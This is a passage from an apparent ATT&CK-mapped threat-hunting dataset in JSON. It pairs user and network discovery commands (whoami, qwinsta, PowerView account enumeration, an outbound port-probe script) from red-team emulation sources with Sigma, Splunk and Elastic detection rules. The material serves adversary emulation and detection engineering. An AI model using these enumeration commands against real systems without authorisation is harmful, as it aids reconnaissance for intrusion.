windows\n\u00a0\u00a0\u00a0\u00a0service: security\ndetection:\n\u00a0\u00a0\u00a0\u00a0selection:\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0EventID: 4688 # have created a new process.\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Newprocessname: 'C: \\ Windows \\ System32 \\ systeminfo.exe' # new process name\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Tokenpromotiontype: 'TokenElevationTypeDefault (1)' # token type lifting\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Processcommandline: 'systeminfo' # command-line process\n\u00a0\u00a0\u00a0\u00a0condition: selection\nlevel: medium", "product": "https://raw.githubusercontent.com/12306Bro/Threathunting-book/master/{}", "name": "Yml"}], "possible_detections": [], "attack_paths": []}, {"commands": [{"source": "https://attack.mitre.org/docs/APT3_Adversary_Emulation_Field_Manual.xlsx", "command": "whoami /all /fo list", "name": "Built-in Windows Command"}, {"source": "https://attack.mitre.org/docs/APT3_Adversary_Emulation_Field_Manual.xlsx", "command": "shell whoami /all /fo list", "name": "Cobalt Strike"}, {"source": "https://attack.mitre.org/docs/APT3_Adversary_Emulation_Field_Manual.xlsx", "command": "getuid", "name": "Metasploit"}, {"source": "atomics/T1033/T1033.yaml", "command": "cmd.exe /C whoami\nwmic useraccount get /ALL\nquser /SERVER:\"computer1\"\nquser\nqwinsta.exe\" /server:computer1\nqwinsta.exe\nfor /F \"tokens=1,2\" %i in ('qwinsta /server:computer1 ^| findstr \"Active Disc\"') do @echo %i | find /v \"#\" | find /v \"console\" || echo %j > usernames.txt\n@FOR /F %n in (computers.txt) DO @FOR /F \"tokens=1,2\" %i in ('qwinsta /server:%n ^| findstr \"Active Disc\"') do @echo %i | find /v \"#\" | find /v \"console\" || echo %j > usernames.txt\n", "name": null}, {"source": "atomics/T1033/T1033.yaml", "command": "users\nw\nwho\n", "name": null}, {"source": "data/abilities/discovery/aaf34d82-aea9-4278-8ec4-789653e4f5d9.yml", "command": {"windows": {"psh": {"parsers": {"plugins.stockpile.app.parsers.json": [{"source": "domain.user.name", "json_key": "samaccountname", "json_type": ["str"]}]}, "command": "Import-Module .\\powerview.ps1 -Force;\nGet-NetUser -AdminCount | ConvertTo-Json -Depth 1\n", "payload": "powerview.ps1"}}}, "name": "Get Administrator users for a computer"}, {"source": "data/abilities/discovery/c0da588f-79f0-4263-8998-7496b1a40596.yml", "command": {"windows": {"psh": {"parsers": {"plugins.stockpile.app.parsers.basic": [{"source": "host.user.name"}]}, "command": "$env:username\n"}, "cmd": {"parsers": {"plugins.stockpile.app.parsers.basic": [{"source": "host.user.name"}]}, "command": "echo %username%"}}, "darwin": {"sh": {"parsers": {"plugins.stockpile.app.parsers.basic": [{"source": "host.user.name"}]}, "command": "whoami"}}, "linux": {"sh": {"parsers": {"plugins.stockpile.app.parsers.basic": [{"source": "host.user.name"}]}, "command": "whoami"}}}, "name": "Find user running agent"}, {"source": "data/abilities/discovery/f1cf4ea1-43f0-4604-9537-3d1b1b2d5b1c.yml", "command": {"windows": {"psh": {"parsers": {"plugins.stockpile.app.parsers.json": [{"source": "domain.user.name", "json_key": "samaccountname", "json_type": ["str"]}]}, "command": "Import-Module .\\powerview.ps1 -Force;\nGet-NetUser -SPN | ConvertTo-Json -Depth 1\n", "payload": "powerview.ps1"}}}, "name": "Get Service Accounts for a domain"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/situational_awareness/network/bloodhound", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/situational_awareness/network/bloodhound", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/situational_awareness/network/powerview/get_session", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/situational_awareness/network/powerview/get_session", "name": "Empire Module Command"}], "command_list": ["whoami /all /fo list", "shell whoami /all /fo list", "getuid", "cmd.exe /C whoami\nwmic useraccount get /ALL\nquser /SERVER:\"computer1\"\nquser\nqwinsta.exe\" /server:computer1\nqwinsta.exe\nfor /F \"tokens=1,2\" %i in ('qwinsta /server:computer1 ^| findstr \"Active Disc\"') do @echo %i | find /v \"#\" | find /v \"console\" || echo %j > usernames.txt\n@FOR /F %n in (computers.txt) DO @FOR /F \"tokens=1,2\" %i in ('qwinsta /server:%n ^| findstr \"Active Disc\"') do @echo %i | find /v \"#\" | find /v \"console\" || echo %j > usernames.txt\n", "users\nw\nwho\n", {"windows": {"psh": {"parsers": {"plugins.stockpile.app.parsers.json": [{"source": "domain.user.name", "json_key": "samaccountname", "json_type": ["str"]}]}, "command": "Import-Module .\\powerview.ps1 -Force;\nGet-NetUser -AdminCount | ConvertTo-Json -Depth 1\n", "payload": "powerview.ps1"}}}, {"windows": {"psh": {"parsers": {"plugins.stockpile.app.parsers.basic": [{"source": "host.user.name"}]}, "command": "$env:username\n"}, "cmd": {"parsers": {"plugins.stockpile.app.parsers.basic": [{"source": "host.user.name"}]}, "command": "echo %username%"}}, "darwin": {"sh": {"parsers": {"plugins.stockpile.app.parsers.basic": [{"source": "host.user.name"}]}, "command": "whoami"}}, "linux": {"sh": {"parsers": {"plugins.stockpile.app.parsers.basic": [{"source": "host.user.name"}]}, "command": "whoami"}}}, {"windows": {"psh": {"parsers": {"plugins.stockpile.app.parsers.json": [{"source": "domain.user.name", "json_key": "samaccountname", "json_type": ["str"]}]}, "command": "Import-Module .\\powerview.ps1 -Force;\nGet-NetUser -SPN | ConvertTo-Json -Depth 1\n", "payload": "powerview.ps1"}}}, "powershell/situational_awareness/network/bloodhound", "powershell/situational_awareness/network/bloodhound", "powershell/situational_awareness/network/powerview/get_session", "powershell/situational_awareness/network/powerview/get_session"], "technique_id": "T1033", "parsed_datasets": [{"Mitre APT3 Adversary Emulation Field Manual": {"Category": "T1033", "Built-in Windows Command": "whoami /all /fo list", "Cobalt Strike": "shell whoami /all /fo list", "Description": "Get current user information, SID, domain, groups the user belongs to, security privs of the user", "Metasploit": "getuid"}}, {"Atomic Red Team Test - System Owner/User Discovery": {"display_name": "System Owner/User Discovery", "atomic_tests": [{"description": "Identify System owner or users on an endpoint\n", "supported_platforms": ["windows"], "name": "System Owner/User Discovery", "input_arguments": {"computer_name": {"default": "computer1", "type": "string", "description": "Name of remote computer"}}, "executor": {"elevation_required": false, "command": "cmd.exe /C whoami\nwmic useraccount get /ALL\nquser /SERVER:\"#{computer_name}\"\nquser\nqwinsta.exe\" /server:#{computer_name}\nqwinsta.exe\nfor /F \"tokens=1,2\" %i in ('qwinsta /server:#{computer_name} ^| findstr \"Active Disc\"') do @echo %i | find /v \"#\" | find /v \"console\" || echo %j > usernames.txt\n@FOR /F %n in (computers.txt) DO @FOR /F \"tokens=1,2\" %i in ('qwinsta /server:%n ^| findstr \"Active Disc\"') do @echo %i | find /v \"#\" | find /v \"console\" || echo %j > usernames.txt\n", "name": "command_prompt"}}, {"description": "Identify System owner or users on an endpoint\n", "supported_platforms": ["linux", "macos"], "name": "System Owner/User Discovery", "executor": {"elevation_required": false, "command": "users\nw\nwho\n", "name": "sh"}}], "attack_technique": "T1033"}}, {"Mitre Stockpile - Get Administrator users for a computer": {"platforms": {"windows": {"psh": {"parsers": {"plugins.stockpile.app.parsers.json": [{"source": "domain.user.name", "json_key": "samaccountname", "json_type": ["str"]}]}, "command": "Import-Module .\\powerview.ps1 -Force;\nGet-NetUser -AdminCount | ConvertTo-Json -Depth 1\n", "payload": "powerview.ps1"}}}, "description": "Get Administrator users for a computer", "tactic": "discovery", "technique": {"attack_id": "T1033", "name": "System Owner/User Discovery"}, "id": "aaf34d82-aea9-4278-8ec4-789653e4f5d9", "name": "GetAdminMembers"}}, {"Mitre Stockpile - Find user running agent": {"platforms": {"windows": {"psh": {"parsers": {"plugins.stockpile.app.parsers.basic": [{"source": "host.user.name"}]}, "command": "$env:username\n"}, "cmd": {"parsers": {"plugins.stockpile.app.parsers.basic": [{"source": "host.user.name"}]}, "command": "echo %username%"}}, "darwin": {"sh": {"parsers": {"plugins.stockpile.app.parsers.basic": [{"source": "host.user.name"}]}, "command": "whoami"}}, "linux": {"sh": {"parsers": {"plugins.stockpile.app.parsers.basic": [{"source": "host.user.name"}]}, "command": "whoami"}}}, "description": "Find user running agent", "tactic": "discovery", "technique": {"attack_id": "T1033", "name": "System Owner/User Discovery"}, "id": "c0da588f-79f0-4263-8998-7496b1a40596", "name": "Identify active user"}}, {"Mitre Stockpile - Get Service Accounts for a domain": {"platforms": {"windows": {"psh": {"parsers": {"plugins.stockpile.app.parsers.json": [{"source": "domain.user.name", "json_key": "samaccountname", "json_type": ["str"]}]}, "command": "Import-Module .\\powerview.ps1 -Force;\nGet-NetUser -SPN | ConvertTo-Json -Depth 1\n", "payload": "powerview.ps1"}}}, "description": "Get Service Accounts for a domain", "tactic": "discovery", "technique": {"attack_id": "T1033", "name": "System Owner/User Discovery"}, "id": "f1cf4ea1-43f0-4604-9537-3d1b1b2d5b1c", "name": "GetServiceAccounts"}}, {"Empire Module XLSX Sheet by dstepanic": {"ATT&CK Technique #1": "T1033", "Empire Module": "powershell/situational_awareness/network/bloodhound", "Technique": "System Owner/User Discovery", "ATT&CK Technique #2": "", "Concatenate for Python Dictionary": "\"powershell/situational_awareness/network/bloodhound\":  [\"T1033\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"ATT&CK Technique #1": "T1033", "Empire Module": "powershell/situational_awareness/network/powerview/get_session", "Technique": "System Owner/User Discovery", "ATT&CK Technique #2": "", "Concatenate for Python Dictionary": "\"powershell/situational_awareness/network/powerview/get_session\":  [\"T1033\"],"}}], "queries": [{"query": "Sysmon| where EventID == 1 and (process_path contains \"whoami.exe\"or process_command_line contains \"whoami\"or file_directory contains \"useraccount get /ALL\"or process_path contains \"qwinsta.exe\"or process_path contains \"quser.exe\"or process_path contains \"systeminfo.exe\")", "product": "Azure Sentinel", "name": "System Owner User Discovery"}, {"query": "title: Whoami Execution\nid: e28a5a99-da44-436d-b7a0-2afc20a5f413\nstatus: experimental\ndescription: Detects the execution of whoami, which is often used by attackers after exloitation / privilege escalation but rarely used by administrators\nreferences:\n    - https://brica.de/alerts/alert/public/1247926/agent-tesla-keylogger-delivered-inside-a-power-iso-daa-archive/\n    - https://app.any.run/tasks/7eaba74e-c1ea-400f-9c17-5e30eee89906/\nauthor: Florian Roth\ndate: 2018/08/13\ntags:\n    - attack.discovery\n    - attack.t1033\n    - car.2016-03-001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image: '*\\whoami.exe'\n    selection2:\n        OriginalFileName: 'whoami.exe'\n    condition: selection or selection2\nfalsepositives:\n    - Admin activity\n    - Scripts and administrative tools used in the monitored environment\nlevel: high", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: Whoami Execution\nid: e28a5a99-da44-436d-b7a0-2afc20a5f413\nstatus: experimental\ndescription: Detects the execution of whoami, which is often used by attackers after exloitation / privilege escalation but rarely used by administrators\nreferences:\n    - https://brica.de/alerts/alert/public/1247926/agent-tesla-keylogger-delivered-inside-a-power-iso-daa-archive/\n    - https://app.any.run/tasks/7eaba74e-c1ea-400f-9c17-5e30eee89906/\nauthor: Florian Roth\ndate: 2018/08/13\ntags:\n    - attack.discovery\n    - attack.t1033\n    - car.2016-03-001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image: '*\\whoami.exe'\n    selection2:\n        OriginalFileName: 'whoami.exe'\n    condition: selection or selection2\nfalsepositives:\n    - Admin activity\n    - Scripts and administrative tools used in the monitored environment\nlevel: high", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "(Image.keyword:*\\\\\\\\whoami.exe OR OriginalFileName:\"whoami.exe\")", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/Whoami-Execution <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"Whoami Execution\",\\n    \"description\": \"Detects the execution of whoami, which is often used by attackers after exloitation / privilege escalation but rarely used by administrators\",\\n    \"tags\": [\\n      \"attack.discovery\",\\n      \"attack.t1033\",\\n      \"car.2016-03-001\"\\n    ],\\n    \"query\": \"(Image.keyword:*\\\\\\\\\\\\\\\\whoami.exe OR OriginalFileName:\\\\\"whoami.exe\\\\\")\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"(Image.keyword:*\\\\\\\\\\\\\\\\whoami.exe OR OriginalFileName:\\\\\"whoami.exe\\\\\")\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'Whoami Execution\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}{{_source}}\\\\n================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "(Image.keyword:*\\\\\\\\whoami.exe OR OriginalFileName:\"whoami.exe\")", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "(Image=\"*\\\\\\\\whoami.exe\" OR OriginalFileName=\"whoami.exe\")", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_id=\"1\" (Image=\"*\\\\\\\\whoami.exe\" OR OriginalFileName=\"whoami.exe\"))", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*(?:.*.*\\\\whoami\\\\.exe|.*whoami\\\\.exe))'", "product": "Atomic Threat Coverage", "name": "grep"}, {"query": "title: Run whoami as SYSTEM\nid: 80167ada-7a12-41ed-b8e9-aa47195c66a1\nstatus: experimental\ndescription: Detects a whoami.exe executed by LOCAL SYSTEM. This may be a sign of a successful local privilege escalation.\nreferences:\n    - https://speakerdeck.com/heirhabarov/hunting-for-privilege-escalation-in-windows-environment\nauthor: Teymur Kheirkhabarov\ndate: 2019/10/23\nmodified: 2019/11/11\ntags:\n    - attack.discovery\n    - attack.privilege_escalation\n    - attack.t1033\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        User: 'NT AUTHORITY\\SYSTEM'\n        Image|endswith: '\\whoami.exe'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: Run whoami as SYSTEM\nid: 80167ada-7a12-41ed-b8e9-aa47195c66a1\nstatus: experimental\ndescription: Detects a whoami.exe executed by LOCAL SYSTEM. This may be a sign of a successful local privilege escalation.\nreferences:\n    - https://speakerdeck.com/heirhabarov/hunting-for-privilege-escalation-in-windows-environment\nauthor: Teymur Kheirkhabarov\ndate: 2019/10/23\nmodified: 2019/11/11\ntags:\n    - attack.discovery\n    - attack.privilege_escalation\n    - attack.t1033\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        User: 'NT AUTHORITY\\SYSTEM'\n        Image|endswith: '\\whoami.exe'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "(User:\"NT\\\\ AUTHORITY\\\\\\\\SYSTEM\" AND Image.keyword:*\\\\\\\\whoami.exe)", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/Run-whoami-as-SYSTEM <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"Run whoami as SYSTEM\",\\n    \"description\": \"Detects a whoami.exe executed by LOCAL SYSTEM. This may be a sign of a successful local privilege escalation.\",\\n    \"tags\": [\\n      \"attack.discovery\",\\n      \"attack.privilege_escalation\",\\n      \"attack.t1033\"\\n    ],\\n    \"query\": \"(User:\\\\\"NT\\\\\\\\ AUTHORITY\\\\\\\\\\\\\\\\SYSTEM\\\\\" AND Image.keyword:*\\\\\\\\\\\\\\\\whoami.exe)\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"(User:\\\\\"NT\\\\\\\\ AUTHORITY\\\\\\\\\\\\\\\\SYSTEM\\\\\" AND Image.keyword:*\\\\\\\\\\\\\\\\whoami.exe)\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'Run whoami as SYSTEM\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}{{_source}}\\\\n================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "(User:\"NT AUTHORITY\\\\\\\\SYSTEM\" AND Image.keyword:*\\\\\\\\whoami.exe)", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "(User=\"NT AUTHORITY\\\\\\\\SYSTEM\" Image=\"*\\\\\\\\whoami.exe\")", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_id=\"1\" User=\"NT AUTHORITY\\\\\\\\SYSTEM\" Image=\"*\\\\\\\\whoami.exe\")", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*(?=.*NT AUTHORITY\\\\SYSTEM)(?=.*.*\\\\whoami\\\\.exe))'", "product": "Atomic Threat Coverage", "name": "grep"}, {"query": "Yml\ntitle: system owner / user found\ndescription: windows server 2016 / Ubuntu19.04\nreferences: https://attack.mitre.org/techniques/T1033/\ntags: T1033\nstatus: experimental\nauthor: 12306Bro\nlogsource:\n\u00a0\u00a0\u00a0\u00a0product: windows\n\u00a0\u00a0\u00a0\u00a0service: security\ndetection:\n\u00a0\u00a0\u00a0\u00a0selection1:\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0EventID: 4688 # have created a new process.\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Newprocessname: 'C: \\ windows \\ system32 \\ whoami.exe' # process information> new process name\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Creatorprocessname: 'C: \\ windows \\ system32 \\ cmd.exe' # Process Information> Creator Process Name\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Processcommandline: whoami # Process information> process command line\n\u00a0\u00a0\u00a0\u00a0selection2:\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0EventID: 4703 # a user's privileges to be adjusted.\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0ProcessName: 'C: \\ Windows \\ System32 \\ whoami.exe' # process information> process name\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0EnabledPrivileges: 'SeDebugPrivilege' permission enabled #\n\u00a0\u00a0\u00a0\u00a0selection3:\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0EventID: 4689 # exited process\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0ProcessName: 'C: \\ Windows \\ System32 \\ whoami.exe' # process information> process name\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Exitstatus: 0x0 # Process information> exit status\n\u00a0\u00a0\u00a0\u00a0timeframe: last 1m # can be adjusted according to actual situation\n\u00a0\u00a0\u00a0\u00a0condition: all of them\nlevel: low\nlogsource:\n\u00a0\u00a0\u00a0\u00a0product: linux\n\u00a0\u00a0\u00a0\u00a0service: history\ndetection:\n\u00a0\u00a0\u00a0\u00a0keywords:\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0- w\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0- who\n\u00a0\u00a0\u00a0\u00a0condition: keywords\nlevel: low", "product": "https://raw.githubusercontent.com/12306Bro/Threathunting-book/master/{}", "name": "Yml"}, {"query": "Yml\ntitle: system owner / user found\ndescription: windows server 2016 / Ubuntu19.04\nreferences: https://attack.mitre.org/techniques/T1033/\ntags: T1033\nstatus: experimental\nauthor: 12306Bro\nlogsource:\n\u00a0\u00a0\u00a0\u00a0product: windows\n\u00a0\u00a0\u00a0\u00a0service: security\ndetection:\n\u00a0\u00a0\u00a0\u00a0selection1:\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0EventID: 4688 # have created a new process.\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Newprocessname: 'C: \\ windows \\ system32 \\ whoami.exe' # process information> new process name\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Creatorprocessname: 'C: \\ windows \\ system32 \\ cmd.exe' # Process Information> Creator Process Name\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Processcommandline: whoami # Process information> process command line\n\u00a0\u00a0\u00a0\u00a0selection2:\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0EventID: 4703 # a user's privileges to be adjusted.\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0ProcessName: 'C: \\ Windows \\ System32 \\ whoami.exe' # process information> process name\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0EnabledPrivileges: 'SeDebugPrivilege' permission enabled #\n\u00a0\u00a0\u00a0\u00a0selection3:\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0EventID: 4689 # exited process\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0ProcessName: 'C: \\ Windows \\ System32 \\ whoami.exe' # process information> process name\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Exitstatus: 0x0 # Process information> exit status\n\u00a0\u00a0\u00a0\u00a0timeframe: last 1m # can be adjusted according to actual situation\n\u00a0\u00a0\u00a0\u00a0condition: all of them\nlevel: low\nlogsource:\n\u00a0\u00a0\u00a0\u00a0product: linux\n\u00a0\u00a0\u00a0\u00a0service: history\ndetection:\n\u00a0\u00a0\u00a0\u00a0keywords:\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0- w\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0- who\n\u00a0\u00a0\u00a0\u00a0condition: keywords\nlevel: low", "product": "https://raw.githubusercontent.com/12306Bro/Threathunting-book/master/{}", "name": "Yml"}], "possible_detections": [], "attack_paths": []}, {"commands": [{"source": "https://attack.mitre.org/docs/APT3_Adversary_Emulation_Field_Manual.xlsx", "command": "ipconfig /all", "name": "Built-in Windows Command"}, {"source": "https://attack.mitre.org/docs/APT3_Adversary_Emulation_Field_Manual.xlsx", "command": "shell ipconfig", "name": "Cobalt Strike"}, {"source": "https://attack.mitre.org/docs/APT3_Adversary_Emulation_Field_Manual.xlsx", "command": "ipconfig\npost/windows/gather/enum_domains", "name": "Metasploit"}, {"source": "https://attack.mitre.org/docs/APT3_Adversary_Emulation_Field_Manual.xlsx", "command": "arp -a\nroute print", "name": "Built-in Windows Command"}, {"source": "https://attack.mitre.org/docs/APT3_Adversary_Emulation_Field_Manual.xlsx", "command": "shell arp -a", "name": "Cobalt Strike"}, {"source": "https://attack.mitre.org/docs/APT3_Adversary_Emulation_Field_Manual.xlsx", "command": "route", "name": "Metasploit"}, {"source": "https://attack.mitre.org/docs/APT3_Adversary_Emulation_Field_Manual.xlsx", "command": "nbtstat -a {IP | COMP_NAME }", "name": "Built-in Windows Command"}, {"source": "https://attack.mitre.org/docs/APT3_Adversary_Emulation_Field_Manual.xlsx", "command": "shell c:\\windows\\sysnative\\nbstat.exe -a {IP | COMP_NAME}", "name": "Cobalt Strike"}, {"source": "atomics/T1016/T1016.yaml", "command": "ipconfig /all\nnetsh interface show\narp -a\nnbtstat -n\nnet config\n", "name": null}, {"source": "atomics/T1016/T1016.yaml", "command": "netsh advfirewall firewall show rule name=all\n", "name": null}, {"source": "atomics/T1016/T1016.yaml", "command": "arp -a\nnetstat -ant | awk '{print $NF}' | grep -v '[a-z]' | sort | uniq -c\nifconfig\n", "name": null}, {"source": "atomics/T1016/T1016.yaml", "command": "ipconfig /all\nnet config workstation\nnet view /all /domain\nnltest /domain_trusts\n", "name": null}, {"source": "atomics/T1016/T1016.yaml", "command": "$ports = Get-content #{port_file}\n$file = \"#{output_file}\"\n$totalopen = 0\n$totalports = 0\nNew-Item $file -Force\nforeach ($port in $ports) {\n    $test = new-object system.Net.Sockets.TcpClient\n    $wait = $test.beginConnect(\"allports.exposed\", $port, $null, $null)\n    $wait.asyncwaithandle.waitone(250, $false) | Out-Null\n    $totalports++ | Out-Null\n    if ($test.Connected) {\n        $result = \"$port open\" \n        Write-Host -ForegroundColor Green $result\n        $result | Out-File -Encoding ASCII -append $file\n        $totalopen++ | Out-Null\n    }\n    else {\n        $result = \"$port closed\" \n        Write-Host -ForegroundColor Red $result\n        $totalclosed++ | Out-Null\n        $result | Out-File -Encoding ASCII -append $file\n    }\n}\n$results = \"There were a total of $totalopen open ports out of $totalports ports tested.\"\n$results | Out-File -Encoding ASCII -append $file\nWrite-Host $results\n", "name": null}, {"source": "atomics/T1016/T1016.yaml", "command": "$ports = Get-content #{port_file}\n$file = \"$env:USERPROFILE\\Desktop\\open-ports.txt\"\n$totalopen = 0\n$totalports = 0\nNew-Item $file -Force\nforeach ($port in $ports) {\n    $test = new-object system.Net.Sockets.TcpClient\n    $wait = $test.beginConnect(\"allports.exposed\", $port, $null, $null)\n    $wait.asyncwaithandle.waitone(250, $false) | Out-Null\n    $totalports++ | Out-Null\n    if ($test.Connected) {\n        $result = \"$port open\" \n        Write-Host -ForegroundColor Green $result\n        $result | Out-File -Encoding ASCII -append $file\n        $totalopen++ | Out-Null\n    }\n    else {\n        $result = \"$port closed\" \n        Write-Host -ForegroundColor Red $result\n        $totalclosed++ | Out-Null\n        $result | Out-File -Encoding ASCII -append $file\n    }\n}\n$results = \"There were a total of $totalopen open ports out of $totalports ports tested.\"\n$results | Out-File -Encoding ASCII -append $file\nWrite-Host $results\n", "name": null}, {"source": "atomics/T1016/T1016.yaml", "command": "$ports = Get-content PathToAtomicsFolder\\T1016\\src\\top-128.txt\n$file = \"#{output_file}\"\n$totalopen = 0\n$totalports = 0\nNew-Item $file -Force\nforeach ($port in $ports) {\n    $test = new-object system.Net.Sockets.TcpClient\n    $wait = $test.beginConnect(\"allports.exposed\", $port, $null, $null)\n    $wait.asyncwaithandle.waitone(250, $false) | Out-Null\n    $totalports++ | Out-Null\n    if ($test.Connected) {\n        $result = \"$port open\" \n        Write-Host -ForegroundColor Green $result\n        $result | Out-File -Encoding ASCII -append $file\n        $totalopen++ | Out-Null\n    }\n    else {\n        $result = \"$port closed\" \n        Write-Host -ForegroundColor Red $result\n        $totalclosed++ | Out-Null\n        $result | Out-File -Encoding ASCII -append $file\n    }\n}\n$results = \"There were a total of $totalopen open ports out of $totalports ports tested.\"\n$results | Out-File -Encoding ASCII -append $file\nWrite-Host $results\n", "name": null}, {"source": "data/abilities/discovery/14a21534-350f-4d83-9dd7-3c56b93a0c17.yml", "command": {"windows": {"psh": {"parsers": {"plugins.stockpile.app.parsers.nbtstat": [{"source": "network.domain.name"}]}, "command": "nbtstat -n\n"}}}, "name": "Find Domain information"}, {"source": "data/abilities/discovery/9a30740d-3aa8-4c23-8efa-d51215e8a5b9.yml", "command": {"windows": {"psh": {"command": ".\\wifi.ps1 -Scan\n", "payload": "wifi.ps1"}}, "darwin": {"sh": {"command": "./wifi.sh scan\n", "payload": "wifi.sh"}}, "linux": {"sh": {"command": "./wifi.sh scan\n", "payload": "wifi.sh"}}}, "name": "View all potential WIFI networks on host"}, {"source": "data/abilities/discovery/a0676fe1-cd52-482e-8dde-349b73f9aa69.yml", "command": {"windows": {"psh": {"command": 